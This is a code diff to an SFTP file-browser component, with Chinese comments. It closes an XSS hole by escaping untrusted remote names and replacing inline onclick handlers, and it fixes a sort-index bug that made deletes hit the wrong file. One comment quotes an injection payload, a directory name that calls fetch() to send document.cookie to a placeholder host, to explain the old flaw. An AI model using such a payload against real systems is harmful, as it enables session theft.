@@ -5,6 +5,8 @@
 
 import { sshConnectionManager } from './sshConnectionManager';
 import { iconForFile, createIconHTML } from '../ui/iconMapping';
+// 目标机由攻击者控制：文件名、属主、路径都是不可信输入，全部要转义后才能进 innerHTML
+import { escapeHtml } from '../core/htmlEscape';
 
 import { logger } from '../core/logger';
 /** 正式包 drop 掉 console，诊断信息只有进 logger 才留得下来（设置→工具→诊断日志 可导出） */
@@ -37,12 +39,15 @@ export class SftpManager {
   private collator = new Intl.Collator(undefined, { sensitivity: 'base', numeric: true, ignorePunctuation: true });
   private uidNameCache: Record<string, string> = {};
   private uidCacheLoaded = false;
+  /** getCurrentFiles() 的排序结果缓存；fileList 或 sortMode 变化时置空 */
+  private sortedCache: SftpFileInfo[] | null = null;
 
   /**
    * 设置排序方式，目录始终排在文件之前
    */
   setSortMode(mode: 'name-asc' | 'name-desc' | 'size-asc' | 'size-desc' | 'modified-asc' | 'modified-desc'): void {
     this.sortMode = mode;
+    this.sortedCache = null;
     this.notifyListeners();
   }
 
@@ -94,8 +99,17 @@ export class SftpManager {
   /**
    * 获取当前文件列表
    */
+  /**
+   * 当前展示顺序的文件列表 —— **索引的唯一真相来源**。
+   *
+   * 表格渲染、右键菜单、详情面板、双击导航必须全部按这个顺序取下标。
+   * 曾经的 bug：fileList 存的是抓取时排好序的副本，而 setSortMode 只改
+   * sortMode 不重排，渲染却按重新排序的结果编号 —— 点过排序表头后，
+   * 右键"删除"删掉的是另一个文件，而详情面板显示的又是对的那个。
+   */
   getCurrentFiles(): SftpFileInfo[] {
-    return this.sortFiles(this.fileList);
+    if (!this.sortedCache) this.sortedCache = this.sortFiles(this.fileList);
+    return this.sortedCache;
   }
 
   /**
@@ -184,11 +198,14 @@ export class SftpManager {
 
   /**
    * 刷新文件列表
+   *
+   * @returns 是否成功拿到新列表。失败时 fileList 保持不变，调用方应据此
+   *          决定是否回滚已经改掉的 currentPath。
    */
-  async refreshFileList(): Promise<void> {
+  async refreshFileList(): Promise<boolean> {
     if (!sshConnectionManager.isConnected()) {
       log.warn('SSH未连接，无法刷新SFTP文件列表');
-      return;
+      return false;
     }
 
     try {
@@ -201,14 +218,21 @@ export class SftpManager {
         path: this.currentPath
       });
 
-      this.fileList = this.sortFiles(files);
+      // 存原始顺序；展示顺序统一由 getCurrentFiles() 负责
+      this.fileList = files;
+      this.sortedCache = null;
       this.notifyListeners();
 
       sshConnectionManager.updateLastActivity();
+      return true;
 
     } catch (error) {
       log.error('获取SFTP文件列表失败:', error);
       window.showNotification && window.showNotification(`获取文件列表失败: ${error}`, 'error');
+      // 返回 false 而不是 throw：本方法有 8 个调用点，其中几个是裸 await，
+      // 抛异常会变成未处理的 rejection。调用方按需检查返回值即可
+      // （navigateToPath 用它回滚路径），忽略返回值的调用方行为不变。
+      return false;
     }
   }
 
@@ -221,12 +245,20 @@ export class SftpManager {
       return;
     }
 
+    const previousPath = this.currentPath;
     try {
       this.isNavigating = true;
       const normalized = this.normalizePath(path);
       log.debug('导航到路径:', normalized);
       this.currentPath = normalized;
-      await this.refreshFileList();
+      const ok = await this.refreshFileList();
+      if (!ok && previousPath !== normalized) {
+        // 加载失败（如权限不足）时回到原路径并重绘，
+        // 避免出现"面包屑显示新目录、列表却是旧目录内容"的错位状态。
+        // refreshFileList 已经提示过用户，这里只负责恢复一致性。
+        this.currentPath = previousPath;
+        this.notifyListeners();
+      }
     } finally {
       this.isNavigating = false;
     }
@@ -330,16 +362,163 @@ export class SftpManager {
    */
   renderBreadcrumbHTML(): string {
     const parts = this.currentPath.split('/').filter(Boolean);
-    let html = '<span class="breadcrumb-segment breadcrumb-root" onclick="sftpManager.navigateToPath(\'/\')" title="根目录">/</span>';
-    
+    // 路径经 data-path 传递、由委托监听读取 dataset —— 值不会被当作 JS 解析。
+    // 原先是内联 onclick 里拼 navigateToPath('<路径>')，一个名为
+    // `'); fetch('http://x/'+document.cookie); //` 的目录即可执行任意脚本。
+    let html = '<span class="breadcrumb-segment breadcrumb-root" data-path="/" title="根目录">/</span>';
+
     let accumulated = '';
     for (let i = 0; i < parts.length; i++) {
       accumulated += '/' + parts[i];
       const isLast = i === parts.length - 1;
       html += '<span class="breadcrumb-sep">›</span>';
-      html += `<span class="breadcrumb-segment${isLast ? ' breadcrumb-current' : ''}" onclick="sftpManager.navigateToPath('${accumulated}')" title="${accumulated}">${parts[i]}</span>`;
+      html += `<span class="breadcrumb-segment${isLast ? ' breadcrumb-current' : ''}" data-path="${escapeHtml(accumulated)}" title="${escapeHtml(accumulated)}">${escapeHtml(parts[i])}</span>`;
     }
     return html;
+  }
+
+  /**
+   * 绑定 SFTP 页面的全部事件委托（工具栏 / 路径栏 / 表格 / 面包屑）。
+   *
+   * **必须在每次页面渲染后调用**，而不是只在首次初始化时调用：
+   * renderMainWorkspace 用 outerHTML 整体替换工作区，切走再切回来时页面
+   * 容器是全新节点，旧节点上的监听随它一起消失。而
+   * initRemoteOperationsPage 有个模块级 initialized 标志会提前 return，
+   * 所以不能把绑定挂在它上面。
+   *
+   * 每个容器用 dataset 守卫，重复调用无副作用。
+   */
+  bindUIEvents(): void {
+    const tbody = document.getElementById('sftp-file-list');
+    if (tbody && !tbody.dataset.sftpBound) {
+      tbody.dataset.sftpBound = '1';
+
+      const rowIndex = (e: Event): number | null => {
+        const row = (e.target as HTMLElement)?.closest?.('tr.sftp-file-row') as HTMLElement | null;
+        if (!row) return null;
+        if (row.dataset.action === 'parent') return -1;
+        const raw = row.dataset.fileIndex;
+        return raw === undefined ? null : Number(raw);
+      };
+
+      tbody.addEventListener('click', (e) => {
+        // 勾选框自己处理，不要连带打开详情
+        if ((e.target as HTMLElement)?.classList?.contains('sftp-row-check')) return;
+        const idx = rowIndex(e);
+        if (idx === null) return;
+        if (idx === -1) { void this.navigateToParent(); return; }
+        (window as any).openSftpDetail?.(idx);
+      });
+
+      tbody.addEventListener('dblclick', (e) => {
+        const idx = rowIndex(e);
+        if (idx === null || idx === -1) return;
+        void this.handleFileClickByIndex(idx);
+      });
+
+      tbody.addEventListener('contextmenu', (e) => {
+        const idx = rowIndex(e);
+        if (idx === null) return;
+        e.preventDefault();
+        if (idx === -1) return;
+        (window as any).showSftpContextMenu?.(e, idx);
+      });
+    }
+
+    const breadcrumb = document.getElementById('sftp-breadcrumb');
+    if (breadcrumb && !breadcrumb.dataset.sftpBound) {
+      breadcrumb.dataset.sftpBound = '1';
+      breadcrumb.addEventListener('click', (e) => {
+        const seg = (e.target as HTMLElement)?.closest?.('.breadcrumb-segment') as HTMLElement | null;
+        const path = seg?.dataset.path;
+        if (path) void this.navigateToPath(path);
+      });
+    }
+
+    this.bindPageEvents();
+  }
+
+  /** 绑定页面级控件（工具栏、路径输入、搜索、排序表头、溢出菜单） */
+  private bindPageEvents(): void {
+    const page = document.getElementById('sftp-page');
+    if (!page || page.dataset.sftpBound) return;
+    page.dataset.sftpBound = '1';
+
+    const w = window as any;
+    const actions: Record<string, () => void> = {
+      upload: () => w.sftpOpenUpload?.(),
+      refresh: () => w.sftpRefresh?.(),
+      'new-folder': () => w.sftpOpenCreateFolder?.(),
+      'new-file': () => w.sftpCreateFile?.(),
+      snapshot: () => w.sftpIntegritySnapshot?.(),
+      history: () => w.toggleSftpHistory?.(),
+      'toggle-side': () => w.toggleSftpSide?.(),
+      up: () => void this.navigateToParent(),
+      home: () => void this.navigateToPath('/'),
+      'toggle-more': () => this.toggleMoreMenu(),
+    };
+
+    page.addEventListener('click', (e) => {
+      const target = e.target as HTMLElement;
+
+      const actionEl = target?.closest?.('[data-sftp-action]') as HTMLElement | null;
+      if (actionEl) {
+        const name = actionEl.dataset.sftpAction!;
+        // 点"更多"以外的任何按钮都先收起溢出菜单
+        if (name !== 'toggle-more') this.closeMoreMenu();
+        actions[name]?.();
+        return;
+      }
+
+      // 排序表头：再次点击同一列时切换升降序
+      const th = target?.closest?.('[data-sftp-sort]') as HTMLElement | null;
+      if (th) {
+        const field = th.dataset.sftpSort!;
+        const asc = `${field}-asc`;
+        const next = this.sortMode === asc ? `${field}-desc` : asc;
+        w.setSftpSortMode?.(next);
+        return;
+      }
+
+      if (target?.id === 'sftp-check-all') {
+        w.sftpToggleAll?.((target as HTMLInputElement).checked);
+        return;
+      }
+
+      // 点击空白处收起溢出菜单
+      this.closeMoreMenu();
+    });
+
+    const pathInput = document.getElementById('sftp-path-input') as HTMLInputElement | null;
+    if (pathInput) {
+      pathInput.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') void this.navigateToPath(pathInput.value);
+      });
+      pathInput.addEventListener('focus', () => pathInput.parentElement?.classList.add('editing'));
+      pathInput.addEventListener('blur', () => pathInput.parentElement?.classList.remove('editing'));
+    }
+
+    const searchInput = document.getElementById('sftp-search-input') as HTMLInputElement | null;
+    searchInput?.addEventListener('input', () => w.sftpFilterFiles?.(searchInput.value));
+
+    // Esc 收起溢出菜单
+    page.addEventListener('keydown', (e) => {
+      if ((e as KeyboardEvent).key === 'Escape') this.closeMoreMenu();
+    });
+  }
+
+  private toggleMoreMenu(): void {
+    const menu = document.getElementById('sftp-more-menu');
+    const btn = document.querySelector('[data-sftp-action="toggle-more"]');
+    const open = menu?.classList.toggle('show') ?? false;
+    btn?.setAttribute('aria-expanded', String(open));
+  }
+
+  private closeMoreMenu(): void {
+    const menu = document.getElementById('sftp-more-menu');
+    if (!menu?.classList.contains('show')) return;
+    menu.classList.remove('show');
+    document.querySelector('[data-sftp-action="toggle-more"]')?.setAttribute('aria-expanded', 'false');
   }
 
   /**
@@ -372,9 +551,9 @@ export class SftpManager {
     if (!sshConnectionManager.isConnected()) {
       return `
         <tr>
-          <td colspan="8" style="padding: 40px; text-align: center; color: var(--text-secondary); font-size: 13px;">
-            <div style="display: flex; flex-direction: column; align-items: center; gap: 12px;">
-              <div style="font-size: 24px; opacity: 0.5;">${createIconHTML('📡', { size: 24 })}</div>
+          <td colspan="8" class="sftp-placeholder-cell">
+            <div class="sftp-placeholder">
+              <div class="sftp-placeholder-icon">${createIconHTML('📡', { size: 24 })}</div>
               <span>SSH未连接 — 请先建立连接</span>
             </div>
           </td>
@@ -386,9 +565,9 @@ export class SftpManager {
     if (this.fileList.length === 0) {
       return `
         <tr>
-          <td colspan="8" style="padding: 40px; text-align: center; color: var(--text-secondary); font-size: 13px;">
-            <div style="display: flex; flex-direction: column; align-items: center; gap: 12px;">
-              <div style="font-size: 24px; opacity: 0.5;">${createIconHTML('📁', { size: 24 })}</div>
+          <td colspan="8" class="sftp-placeholder-cell">
+            <div class="sftp-placeholder">
+              <div class="sftp-placeholder-icon">${createIconHTML('📁', { size: 24 })}</div>
               <span>目录为空</span>
             </div>
           </td>
@@ -402,7 +581,7 @@ export class SftpManager {
     // 上级目录项
     if (this.currentPath !== '/') {
       html += `
-        <tr class="sftp-file-row parent-dir-item" data-action="parent" oncontextmenu="return false;" onclick="sftpManager.navigateToParent()">
+        <tr class="sftp-file-row parent-dir-item" data-action="parent">
           <td class="sftp-td-check"></td>
           <td class="file-icon-cell">
             <div class="file-icon">${iconForFile('', true)}</div>
@@ -438,24 +617,21 @@ export class SftpManager {
       // Root owner highlight
       const ownerClass = ownerName === 'root' ? 'owner-root' : '';
 
-      const style = `--row-index: ${index}`;
-
+      // file.name / ownerDisplay 来自远程且属主名还掺了 /etc/passwd 的解析结果，
+      // 全部是攻击者可控的；typeLabel/perms/modified 目前取自封闭集合，
+      // 一并转义以免日后有人扩展来源时漏掉。icon 是我们自己生成的 SVG，保持原样。
       html += `
-        <tr class="sftp-file-row ${riskClass}" data-file-index="${index}"
-            oncontextmenu="window.showSftpContextMenu(event, ${index}); return false;"
-            onclick="window.openSftpDetail && window.openSftpDetail(${index})"
-            ondblclick="sftpManager.handleFileClickByIndex(${index})"
-            style="${style}">
-          <td class="sftp-td-check"><input type="checkbox" class="sftp-row-check" onclick="event.stopPropagation()"></td>
+        <tr class="sftp-file-row ${riskClass}" data-file-index="${index}">
+          <td class="sftp-td-check"><input type="checkbox" class="sftp-row-check"></td>
           <td class="file-icon-cell">
             <div class="file-icon">${icon}</div>
-            <span class="file-name" title="${file.name}">${file.name}</span>
+            <span class="file-name" title="${escapeHtml(file.name)}">${escapeHtml(file.name)}</span>
           </td>
-          <td class="sftp-td-type">${typeLabel}</td>
-          <td class="sftp-td-size">${sizeText}</td>
-          <td class="perms-cell">${perms}</td>
-          <td class="owner-cell ${ownerClass}">${ownerDisplay}</td>
-          <td class="sftp-td-time">${modified}</td>
+          <td class="sftp-td-type">${escapeHtml(typeLabel)}</td>
+          <td class="sftp-td-size">${escapeHtml(sizeText)}</td>
+          <td class="perms-cell">${escapeHtml(perms)}</td>
+          <td class="owner-cell ${ownerClass}">${escapeHtml(ownerDisplay)}</td>
+          <td class="sftp-td-time">${escapeHtml(modified)}</td>
           <td class="sftp-td-risk">${riskTag}</td>
         </tr>
       `;
@@ -463,28 +639,25 @@ export class SftpManager {
 
     // Update status bar
     setTimeout(() => {
-      const countEl = document.getElementById('sftp-status-count');
-      if (countEl) countEl.innerHTML = `<span>${sortedFiles.length} 项</span>`;
+      // 内容替换完成后（重）绑定委托监听；内部有 dataset 守卫，重复调用无副作用
+      this.bindUIEvents();
 
-      // Update risk count
-      const riskEl = document.getElementById('sftp-status-risk');
+      // 计数与风险数已从底部状态栏移到标题旁的 chip（底部状态栏没人看）
+      const countEl = document.getElementById('sftp-chip-count');
+      if (countEl) countEl.textContent = `${sortedFiles.length} 项`;
+
+      const riskEl = document.getElementById('sftp-chip-risk');
       const riskCountEl = document.getElementById('sftp-risk-count');
       if (riskEl && riskCountEl) {
-        if (riskCount > 0) {
-          riskEl.style.display = '';
-          riskCountEl.textContent = String(riskCount);
-        } else {
-          riskEl.style.display = 'none';
-        }
+        riskEl.hidden = riskCount === 0;
+        if (riskCount > 0) riskCountEl.textContent = String(riskCount);
       }
 
       // Update breadcrumb
       const breadcrumb = document.getElementById('sftp-breadcrumb');
       if (breadcrumb) breadcrumb.innerHTML = this.renderBreadcrumbHTML();
 
-      // Update path in status bar
-      const pathEl = document.getElementById('sftp-status-path');
-      if (pathEl) pathEl.innerHTML = `<span>${this.currentPath}</span>`;
+      // 当前路径已由面包屑呈现，底部状态栏的重复显示随状态栏一并移除
 
       // 敏感目录审计横幅：在敏感目录（或其子目录）时显示
       const banner = document.getElementById('sftp-audit-banner');
@@ -506,8 +679,10 @@ export class SftpManager {
    */
   async handleFileClickByIndex(index: number): Promise<void> {
     try {
-      if (index >= 0 && index < this.fileList.length) {
-        const file = this.fileList[index];
+      // 必须用 getCurrentFiles()：下标是渲染时按展示顺序发的
+      const files = this.getCurrentFiles();
+      if (index >= 0 && index < files.length) {
+        const file = files[index];
         log.debug('点击文件', { name: file.name, type: file.file_type });
 
         if (this.isNavigating) {
@@ -524,8 +699,11 @@ export class SftpManager {
 
 
   public getFileByIndex(index: number): SftpFileInfo | null {
-    if (index < 0 || index >= this.fileList.length) return null;
-    return this.fileList[index];
+    // 同 handleFileClickByIndex：下标属于展示顺序，不是抓取顺序。
+    // 右键菜单的删除/重命名走这里 —— 取错等于对错误的文件执行破坏性操作。
+    const files = this.getCurrentFiles();
+    if (index < 0 || index >= files.length) return null;
+    return files[index];
   }
 
   private isNavigating: boolean = false;
